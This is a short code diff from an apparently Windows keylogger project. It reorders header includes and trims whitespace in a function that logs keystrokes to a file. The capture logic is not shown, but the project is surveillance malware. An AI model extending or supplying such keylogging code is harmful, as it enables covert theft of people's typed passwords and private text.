@@ -34,8 +34,9 @@
 #include <windows.h>
 
 //---------------------------------------------------------- PERSONNAL INCLUDES
-#include "includes/bb-keylogger-keyboard.h"
 #include "includes/bb-keylogger-globals.h"
+#include "includes/bb-keylogger-keyboard.h"
+#include "includes/bb-keylogger-utils.h"
 
 //------------------------------------------------------------------- FUNCTIONS
 
@@ -51,7 +52,6 @@ void log_keystrokes( FILE * log_file )
 		log_stream_keystrokes( log_file );
 		log_mathematical_operators_keystrokes( log_file );
 		log_others_keystrokes( log_file );	
-		
 	}
 }
 
